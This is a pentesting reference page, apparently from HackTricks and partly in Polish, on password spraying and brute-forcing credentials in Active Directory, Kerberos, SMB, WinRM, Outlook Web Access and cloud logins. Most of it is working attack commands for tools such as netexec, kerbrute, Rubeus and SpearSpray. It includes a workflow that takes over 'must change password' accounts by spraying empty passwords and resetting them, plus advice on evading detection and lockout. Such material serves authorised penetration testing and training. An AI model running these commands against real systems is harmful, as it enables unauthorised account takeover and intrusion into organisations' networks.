# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Po znalezieniu kilku **valid usernames** możesz spróbować najpopularniejszych **common passwords** (uwzględniając password policy środowiska) dla każdego z odkrytych użytkowników.\
By **default** the **minimum** **password** **length** is **7**.

Listy common usernames mogą być również przydatne: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Zwróć uwagę, że możesz **could lockout some accounts if you try several wrong passwords** (by default więcej niż 10).

### Get password policy

Jeśli masz jakieś user credentials lub shell jako domain user, możesz **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Eksploatacja z Linuxa (lub ogólnie)

- Przy użyciu **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Używanie **NetExec (CME successor)** do ukierunkowanego, niskoszumowego sprayingu przez SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Korzystanie z [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(możesz wskazać liczbę prób, aby uniknąć zablokowań):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Używanie [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIE ZALECANE, CZASAMI NIE DZIAŁA
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Za pomocą modułu `scanner/smb/smb_login` w **Metasploit**:

![](<../../images/image (745).png>)

- Używając **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Z Windows

- Za pomocą [Rubeus](https://github.com/Zer1t0/Rubeus) w wersji z modułem brute:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Z [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Domyślnie może wygenerować użytkowników z domeny, pobrać politykę haseł i ograniczyć próby zgodnie z nią):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Za pomocą [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Zidentyfikuj i przejmij konta "Password must change at next logon" (SAMR)

Technika niskiego poziomu hałasu polega na spray a benign/empty password i wykryciu kont zwracających STATUS_PASSWORD_MUST_CHANGE, co wskazuje, że hasło zostało wymuszone do wygaśnięcia i można je zmienić bez znajomości starego.

Workflow:
- Wykonaj enumerację użytkowników (RID brute via SAMR), aby zbudować listę celów:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Użyj password spraying z pustym hasłem i kontynuuj po trafieniach, aby przejąć konta, które muszą zmienić hasło przy następnym logowaniu:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Dla każdego trafienia zmień hasło przez SAMR za pomocą modułu NetExec (stare hasło nie jest potrzebne, gdy ustawione jest "must change"):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Uwagi operacyjne:
- Upewnij się, że zegar hosta jest zsynchronizowany z DC przed operacjami opartymi na Kerberos: `sudo ntpdate <dc_fqdn>`.
- Znak [+] bez (Pwn3d!) w niektórych modułach (np. RDP/WinRM) oznacza, że creds są prawidłowe, ale konto nie ma praw do logowania interaktywnego.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying zmniejsza hałas w porównaniu z próbami bind SMB/NTLM/LDAP i lepiej współgra z politykami lockout w AD. SpearSpray łączy LDAP-driven targeting, pattern engine oraz policy awareness (domain policy + PSOs + bufor badPwdCount), aby wykonywać spray precyzyjnie i bezpiecznie. Może też oznaczać przejęte principals w Neo4j dla ścieżek w BloodHound.

Key ideas:
- LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
- Domain lockout policy + PSO-aware filtering to leave a configurable attempt buffer (threshold) and avoid locking users.
- Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
- Pattern-based, per-user password generation using variables like names and temporal values derived from each user’s pwdLastSet.
- Throughput control with threads, jitter, and max requests per second.
- Optional Neo4j integration to mark owned users for BloodHound.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Celowanie i kontrola wzorców:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Kontrole ukrycia i bezpieczeństwa:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound wzbogacanie:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Przegląd systemu wzorców (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Dostępne zmienne obejmują:
- {name}, {samaccountname}
- Wartości czasowe z każdego użytkownika: pwdLastSet (lub whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Pomocnicze elementy kompozycji i token organizacji: {separator}, {suffix}, {extra}

Uwagi operacyjne:
- Preferuj zapytania do PDC-emulator z użyciem -dc, aby odczytać najbardziej autorytatywne badPwdCount i informacje związane z polityką.
- Reset badPwdCount jest wyzwalany przy następnym podejściu po okresie obserwacji; stosuj progi i odpowiednie odstępy czasowe, aby zachować bezpieczeństwo.
- Próby Kerberos pre-auth pojawiają się jako 4768/4771 w DC telemetry; używaj jitter i rate-limiting, aby się wtopić.

> Wskazówka: Domyślny rozmiar strony LDAP w SpearSpray to 200; w razie potrzeby dostosuj za pomocą -lps.

## Outlook Web Access

Jest wiele narzędzi do p**assword spraying outlook**.

- Za pomocą [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- z [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Za pomocą [Ruler](https://github.com/sensepost/ruler) (niezawodne!)
- Za pomocą [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Za pomocą [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Aby użyć któregokolwiek z tych narzędzi, potrzebujesz listy użytkowników oraz password / a small list of passwords to spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Źródła

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
